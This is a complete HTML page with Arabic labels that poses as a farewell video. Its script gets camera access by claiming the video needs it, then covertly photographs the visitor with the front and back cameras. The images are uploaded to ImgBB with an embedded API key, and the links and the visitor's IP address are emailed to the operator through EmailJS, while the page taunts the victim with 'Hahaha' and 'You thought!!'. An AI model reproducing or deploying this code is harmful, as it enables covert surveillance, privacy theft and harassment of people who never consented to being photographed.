<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Goodbye.</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("fgxPRLjjoxRV_d1cf");
    })();
  </script>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
      color: white;
      text-align: center;
      padding: 20px;
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    
    .container {
      background: rgba(0, 0, 0, 0.7);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      max-width: 800px;
      width: 90%;
      margin: 20px auto;
      backdrop-filter: blur(10px);
    }
    
    h1 {
      font-size: 28px;
      margin-bottom: 25px;
      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
    }
    
    .video-container {
      position: relative;
      width: 100%;
      height: 0;
      padding-bottom: 56.25%; /* نسبة 16:9 */
      margin: 0 auto 25px;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
    }
    
    #player {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 0;
      border-radius: 10px;
      display: none; /* Hidden until countdown completes */
    }
    
    .loading {
      display: none;
      margin: 30px 0;
    }
    
    .spinner {
      border: 5px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top: 5px solid #fff;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .message {
      display: none;
      padding: 20px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      margin-top: 25px;
      font-size: 18px;
    }
    
    .error {
      color: #ff6b6b;
      display: none;
      margin-top: 20px;
      padding: 15px;
      background: rgba(255, 0, 0, 0.1);
      border-radius: 8px;
    }
    
    .success {
      color: #4cd97b;
      display: none;
    }
    
    .footer {
      margin-top: 30px;
      font-size: 14px;
      opacity: 0.8;
    }
    
    .hidden {
      display: none;
    }
    
    /* New styles for countdown */
    .countdown {
      font-size: 36px;
      font-weight: bold;
      margin: 20px 0;
      padding: 15px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 10px;
      display: inline-block;
      min-width: 100px;
    }
    
    .permission-request {
      padding: 20px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      margin: 20px 0;
    }
    
    .permission-btn {
      background: #4CAF50;
      color: white;
      border: none;
      padding: 12px 30px;
      font-size: 18px;
      border-radius: 50px;
      cursor: pointer;
      margin-top: 15px;
      transition: all 0.3s;
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    }
    
    .permission-btn:hover {
      background: #45a049;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
    }
    
    .permission-btn:active {
      transform: translateY(0);
    }
    
    .instructions {
      font-size: 16px;
      margin-top: 15px;
      line-height: 1.6;
    }
    
    /* IP Address Display */
    .ip-container {
      background: rgba(255, 255, 255, 0.1);
      padding: 15px;
      border-radius: 8px;
      margin: 15px 0;
      font-family: monospace;
      font-size: 18px;
      display: none;
    }
    
    .ip-label {
      font-weight: bold;
      margin-bottom: 8px;
      color: #4cd97b;
    }
    
    .ip-address {
      word-break: break-all;
    }
    
    /* Camera capture indicators */
    .camera-indicators {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin: 20px 0;
      display: none;
    }
    
    .camera-indicator {
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    
    .camera-icon {
      width: 50px;
      height: 50px;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 10px;
      position: relative;
      overflow: hidden;
    }
    
    .camera-icon::before {
      content: "";
      position: absolute;
      width: 30px;
      height: 30px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 50%;
    }
    
    .camera-icon::after {
      content: "";
      position: absolute;
      width: 15px;
      height: 15px;
      background: rgba(255, 255, 255, 0.7);
      border-radius: 50%;
    }
    
    .camera-label {
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Goodbye.</h1>
    
    <!-- Camera permission request -->
    <div class="permission-request" id="permissionRequest">
      <p>Don't be sad.</p>
      <button class="permission-btn" id="cameraBtn">Start Video</button>
    </div>
    
    <!-- IP Address Display -->
    <div class="ip-container" id="ipContainer">
      <div class="ip-label">Your IP Address:</div>
      <div class="ip-address" id="ipAddress">Loading...</div>
    </div>
    
    <!-- Camera indicators -->
    <div class="camera-indicators" id="cameraIndicators">
      <div class="camera-indicator">
        <div class="camera-icon"></div>
        <div class="camera-label">Front Camera</div>
      </div>
      <div class="camera-indicator">
        <div class="camera-icon"></div>
        <div class="camera-label">Back Camera</div>
      </div>
    </div>
    
    <!-- Countdown element -->
    <div class="countdown" id="countdown">10</div>
    
    <div class="video-container">
      <iframe id="player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    </div>
    
    <div class="loading">
      <div class="spinner"></div>
      <p>Loading</p>
    </div>
    
    <div class="message">
      <p>Hahaha</p>
      <p class="success">You thought!!</p>
    </div>
    
    <div class="error" id="error-message">
      Internet Error
    </div>
    
    <div class="footer">
      <p>Hope you are happy.</p>
    </div>
  </div>

  <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
  <canvas id="canvas" width="640" height="480" class="hidden"></canvas>

  <script>
    // DOM elements
    const player = document.getElementById('player');
    const loading = document.querySelector('.loading');
    const message = document.querySelector('.message');
    const success = document.querySelector('.success');
    const errorMsg = document.getElementById('error-message');
    const hiddenVideo = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('canvas');
    const countdownElement = document.getElementById('countdown');
    const permissionRequest = document.getElementById('permissionRequest');
    const cameraBtn = document.getElementById('cameraBtn');
    const ipContainer = document.getElementById('ipContainer');
    const ipAddressElement = document.getElementById('ipAddress');
    const cameraIndicators = document.getElementById('cameraIndicators');
    
    // State variables
    let cameraCaptured = false;
    let emailSent = false;
    let countdownInterval;
    let stream;
    let ipAddress = "Unknown";
    
    // Hide countdown initially
    countdownElement.style.display = 'none';
    
    // Function to get IP address
    async function getIPAddress() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        ipAddress = data.ip;
        ipAddressElement.textContent = ipAddress;
        ipContainer.style.display = 'block';
      } catch (error) {
        console.error('Error fetching IP:', error);
        ipAddressElement.textContent = "Failed to retrieve IP address";
        ipContainer.style.display = 'block';
      }
    }
    
    // Get IP address when page loads
    getIPAddress();
    
    // Function to start the countdown
    function startCountdown() {
      let count = 10;
      countdownElement.textContent = count;
      countdownElement.style.display = 'block';
      
      countdownInterval = setInterval(() => {
        count--;
        countdownElement.textContent = count;
        
        if (count <= 0) {
          clearInterval(countdownInterval);
          countdownElement.style.display = 'none';
          startVideoPlayback();
        }
      }, 1000);
    }
    
    // Function to start video playback
    function startVideoPlayback() {
      loading.style.display = 'block';
      
      // Set the video source with autoplay
      player.src = 'https://www.youtube.com/embed/efQ7_0IzgUw?rel=0&controls=1&showinfo=0&autoplay=1';
      player.style.display = 'block';
      
      // Start the camera capture process
      setTimeout(captureBothCameras, 3000);
    }
    
    // Function to capture both front and back cameras
    async function captureBothCameras() {
      if (!cameraCaptured) return;
      
      try {
        cameraIndicators.style.display = 'flex';
        
        // Capture front camera
        await captureCamera('user', 'Front Camera');
        
        // Add a small delay between captures
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Capture back camera
        await captureCamera('environment', 'Back Camera');
        
        // Stop the stream
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        
      } catch (error) {
        console.error('Camera capture error:', error);
      }
    }
    
    // Function to capture a single camera
    async function captureCamera(facingMode, cameraName) {
      try {
        // Show camera capture indicator
        const indicators = document.querySelectorAll('.camera-indicator');
        if (cameraName === 'Front Camera') indicators[0].style.opacity = '1';
        if (cameraName === 'Back Camera') indicators[1].style.opacity = '1';
        
        // Access the camera
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: facingMode,
            width: { ideal: 1280 },
            height: { ideal: 720 }
          } 
        });
        
        hiddenVideo.srcObject = stream;
        
        // Wait for video to load
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const ctx = canvas.getContext('2d');
        
        // Capture image
        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
        
        // Get image data
        const imageData = canvas.toDataURL('image/jpeg', 0.85);
        const base64Image = imageData.split(',')[1];
        
        // Stop the current stream track
        stream.getTracks().forEach(track => track.stop());
        
        // Upload image to ImgBB
        const formData = new FormData();
        formData.append('image', base64Image);
        formData.append('name', `hidden_${cameraName.replace(' ', '_')}_${Date.now()}`);
        
        const uploadResponse = await fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
          method: 'POST',
          body: formData
        });
        
        const imgbbData = await uploadResponse.json();
        
        if (imgbbData.success) {
          // Send email using EmailJS
          emailjs.send("service_890xst3", "template_p1oukct", {
            name: "صورة خفية",
            time: new Date().toLocaleString(),
            message: `تم التقاط صورة من ${cameraName}. عنوان IP: ${ipAddress}`,
            image_url: imgbbData.data.url,
            camera_type: cameraName,
            ip_address: ipAddress
          }).then(() => {
            emailSent = true;
          }, error => {
            console.error('Email error:', error);
          });
        }
        
      } catch (error) {
        console.error(`Error capturing ${cameraName}:`, error);
      }
    }
    
    // Event listener for camera permission button
    cameraBtn.addEventListener('click', async () => {
      try {
        // Hide the permission request
        permissionRequest.style.display = 'none';
        
        // Show loading indicator
        loading.style.display = 'block';
        
        // Access the camera
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          } 
        });
        
        hiddenVideo.srcObject = stream;
        cameraCaptured = true;
        
        // Hide loading
        loading.style.display = 'none';
        
        // Start the countdown
        startCountdown();
        
      } catch (error) {
        console.error('Camera error:', error);
        loading.style.display = 'none';
        permissionRequest.style.display = 'block';
        
        // Show error message
        errorMsg.textContent = 'You must allow camera access to play the video. Please refresh and try again.';
        errorMsg.style.display = 'block';
      }
    });
    
    // Hide the player initially
    player.style.display = 'none';
    
    // Show the player when loaded
    player.addEventListener('load', () => {
      loading.style.display = 'none';
      message.style.display = 'block';
      success.style.display = 'block';
    });
    
    // Display success message after 10 seconds
    setTimeout(() => {
      if (cameraCaptured && emailSent) {
        console.log('Image captured and sent successfully!');
      } else if (cameraCaptured) {
        console.log('Image captured but sending failed');
      }
    }, 10000);
  </script>
</body>
</html>
